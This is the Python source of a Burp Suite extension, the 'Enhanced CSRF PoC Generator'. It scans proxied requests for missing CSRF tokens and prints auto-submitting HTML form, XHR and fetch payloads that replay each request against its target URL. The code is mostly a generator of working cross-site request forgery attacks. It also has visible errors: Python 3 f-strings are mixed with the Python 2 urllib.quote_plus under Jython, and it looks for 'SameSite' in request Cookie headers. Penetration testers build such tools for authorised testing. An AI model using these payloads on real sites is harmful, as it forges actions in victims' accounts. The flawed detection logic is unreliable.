from burp import IBurpExtender, IHttpListener, IExtensionHelpers
from java.io import PrintWriter
from java.net import URL
import urllib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Enhanced CSRF PoC Generator")
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        # Register HTTP listener
        callbacks.registerHttpListener(self)

        self._stdout.println("[+] CSRF PoC Generator loaded successfully!")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return  # Only process requests

        request_info = self._helpers.analyzeRequest(messageInfo)
        headers = request_info.getHeaders()
        method = request_info.getMethod()
        url = request_info.getUrl()
        body_bytes = messageInfo.getRequest()[request_info.getBodyOffset():]
        body = self._helpers.bytesToString(body_bytes)

        # Check for CSRF vulnerability
        if self.is_csrf_vulnerable(request_info, headers, body):
            self._stdout.println(f"[!] Potential CSRF vulnerability found: {url}")
            self.generate_csrf_poc(request_info, url, headers, body)

    def is_csrf_vulnerable(self, request_info, headers, body):
        """
        Check if the request is potentially vulnerable to CSRF.
        """
        # 1. Check if request is GET (usually not CSRF-vulnerable)
        if request_info.getMethod() == "GET":
            return False

        # 2. Check if CSRF token is missing in headers
        csrf_headers = ["X-CSRF-Token", "X-XSRF-Token"]
        for header in headers:
            if any(csrf in header for csrf in csrf_headers):
                return False  # CSRF protection exists

        # 3. Check if CSRF token is missing in request body (for form submissions)
        if any(token in body.lower() for token in ["csrf_token", "authenticity_token"]):
            return False  # CSRF token found

        # 4. Check if SameSite=None in cookies (Weak CSRF protection)
        cookies = [h for h in headers if h.lower().startswith("cookie:")]
        for cookie in cookies:
            if "SameSite=None" in cookie:
                return True

        # 5. If no CSRF protection detected, flag as vulnerable
        return True

    def generate_csrf_poc(self, request_info, url, headers, body):
        """
        Generate CSRF PoCs (HTML form, XHR, Fetch JS).
        """
        method = request_info.getMethod()

        # Encode body for safe transmission
        encoded_body = urllib.quote_plus(body) if body else ""

        # Generate HTML Form PoC
        html_form = f"""
        <html>
            <body>
                <form action="{url}" method="{method}">
                    {self.generate_form_fields(body)}
                </form>
                <script>document.forms[0].submit();</script>
            </body>
        </html>
        """
        self._stdout.println("[+] HTML Form PoC:\n" + html_form)

        # Generate XHR PoC with Headers
        xhr_poc = f"""
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open("{method}", "{url}", true);
            {self.generate_header_js(headers)}
            xhr.send("{encoded_body}");
        </script>
        """
        self._stdout.println("[+] XHR PoC:\n" + xhr_poc)

        # Generate Fetch PoC with Headers
        fetch_poc = f"""
        <script>
            fetch("{url}", {{
                method: "{method}",
                headers: {{
                    {self.generate_header_json(headers)}
                }},
                body: "{encoded_body}"
            }});
        </script>
        """
        self._stdout.println("[+] Fetch PoC:\n" + fetch_poc)

    def generate_form_fields(self, body):
        """
        Generate form fields from the request body.
        """
        if not body:
            return ""
        fields = []
        for pair in body.split("&"):
            if "=" in pair:
                key, value = pair.split("=", 1)
                fields.append(f'<input type="hidden" name="{key}" value="{value}">')
        return "\n".join(fields)

    def generate_header_js(self, headers):
        """
        Generate JavaScript code to set request headers for XHR PoC.
        """
        header_js = []
        for header in headers:
            if ":" in header:
                key, value = header.split(":", 1)
                if "cookie" not in key.lower():  # Avoid leaking session cookies
                    header_js.append(f'xhr.setRequestHeader("{key.strip()}", "{value.strip()}");')
        return "\n".join(header_js)

    def generate_header_json(self, headers):
        """
        Generate JSON representation of headers for Fetch PoC.
        """
        header_dict = {}
        for header in headers:
            if ":" in header:
                key, value = header.split(":", 1)
                if "cookie" not in key.lower():  # Avoid leaking session cookies
                    header_dict[key.strip()] = value.strip()
        return ",\n".join([f'"{k}": "{v}"' for k, v in header_dict.items()])

